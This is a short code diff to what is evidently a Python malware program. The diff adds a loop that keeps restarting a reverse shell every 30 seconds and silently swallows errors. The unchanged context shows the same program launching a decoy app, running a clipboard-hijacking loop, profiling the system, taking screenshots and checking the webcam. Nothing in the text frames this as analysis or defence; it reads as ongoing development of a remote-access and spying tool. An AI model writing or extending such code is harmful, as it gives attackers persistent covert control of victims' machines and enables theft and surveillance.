@@ -479,10 +479,19 @@ import pyautogui
 pyautogui.FAILSAFE = False
 
 # === EXECUTE CHAIN ===
+def keep_reverse_shell_alive():
+    while True:
+        try:
+            reverse_shell()
+        except Exception as e:
+            pass
+        time.sleep(30)
+
+
 def run():
     launch_distraction_app()
     threading.Thread(target=clipper_loop, daemon=True).start()
-    threading.Thread(target=reverse_shell, daemon=True).start()  # ← NEW LINE
+    threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
     profile_system()
     take_screenshot()
     if check_webcam():
